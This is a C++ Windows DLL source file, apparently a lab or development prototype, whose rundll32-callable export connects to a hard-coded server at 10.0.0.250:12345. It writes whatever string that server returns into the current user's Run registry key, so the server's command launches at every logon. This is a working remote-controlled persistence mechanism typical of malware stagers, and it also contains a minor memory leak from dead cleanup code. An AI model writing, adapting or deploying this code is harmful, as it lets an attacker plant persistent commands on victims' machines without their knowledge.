#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <ws2tcpip.h>
#include <fstream>

// Link with ws2_32.lib
#pragma comment(lib, "ws2_32.lib")

void logToFile(const std::wstring& message) {

    std::ofstream logFile("C:\\users\\dev\\Desktop\\logfile.txt", std::ios_base::app);
    if (!logFile) {
        MessageBox(NULL, L"Failed to open log file", L"Log Error", MB_OK | MB_ICONERROR);
        return;
    }
    logFile << std::string(message.begin(), message.end()) << std::endl; // Convert to std::string
    logFile.close();
}
wchar_t* convert_server_response(const char* recvBuffer) {
    // Determine the length of the wide string buffer required
    int len = MultiByteToWideChar(CP_ACP, 0, recvBuffer, -1, NULL, 0);

    // Allocate memory for the wide string buffer
    wchar_t* wRecvBuffer = new wchar_t[len];

    // Convert the received buffer from char* to wchar_t*
    MultiByteToWideChar(CP_ACP, 0, recvBuffer, -1, wRecvBuffer, len);

    // Display the message box with the converted buffer
    //MessageBox(NULL, wRecvBuffer, L"RUNDLL32", MB_OK);
    return wRecvBuffer;
    // Free the allocated memory
    delete[] wRecvBuffer;
}

bool createRegistryEntryInRun(const std::wstring& uuid) {
    HKEY hKey;
    LPCWSTR subKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    LPCWSTR valueName = L"UUID";

    // Open the Run registry key in HKCU
    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, subKey, 0, KEY_SET_VALUE, &hKey);
    if (result != ERROR_SUCCESS) {
        std::wcerr << L"Failed to open registry key. Error: " << result << std::endl;
        return false;
    }

    // Set the UUID value in the Run registry key
    result = RegSetValueEx(hKey, valueName, 0, REG_SZ, reinterpret_cast<const BYTE*>(uuid.c_str()), (uuid.size() + 1) * sizeof(wchar_t));
    if (result != ERROR_SUCCESS) {
        std::wcerr << L"Failed to set registry value. Error: " << result << std::endl;
        RegCloseKey(hKey);
        return false;
    }

    // Close the registry key handle
    RegCloseKey(hKey);
    return true;
}


// DLL entry point
extern "C" __declspec(dllexport) void CALLBACK RunDllEntry(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
        WSADATA wsaData;
        SOCKET ConnectSocket = INVALID_SOCKET;
        struct sockaddr_in serverAddr;
        char recvBuffer[64];  // Buffer to store received UUID

        // Initialize Winsock
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            return ;
        }

        // Create a socket for connecting to the server
        ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (ConnectSocket == INVALID_SOCKET) {
            WSACleanup();
            return ;
        }

        // Set up the sockaddr structure
        serverAddr.sin_family = AF_INET;
        if (inet_pton(AF_INET, "10.0.0.250", &serverAddr.sin_addr) <= 0) {
            std::cerr << "Invalid address or address not supported" << std::endl;
            closesocket(ConnectSocket);
            WSACleanup();
            return ;
        }
        serverAddr.sin_port = htons(12345);

        // Attempt to connect to the server
        if (connect(ConnectSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            WSACleanup();
            return ;
        }

        // Wait for the server to send back a UUID (blocking call)
        int bytesReceived = recv(ConnectSocket, recvBuffer, sizeof(recvBuffer) - 1, 0);
        if (bytesReceived > 0) {
            recvBuffer[bytesReceived] = '\0'; // Null-terminate the received data
          }
        else {
            std::cout << "Failed to receive data from server or connection closed." << std::endl;
        }
        wchar_t* uuid = convert_server_response(recvBuffer);
        logToFile(uuid);
        createRegistryEntryInRun(uuid);

        // Close the socket and clean up Winsock
        closesocket(ConnectSocket);
        WSACleanup();
}
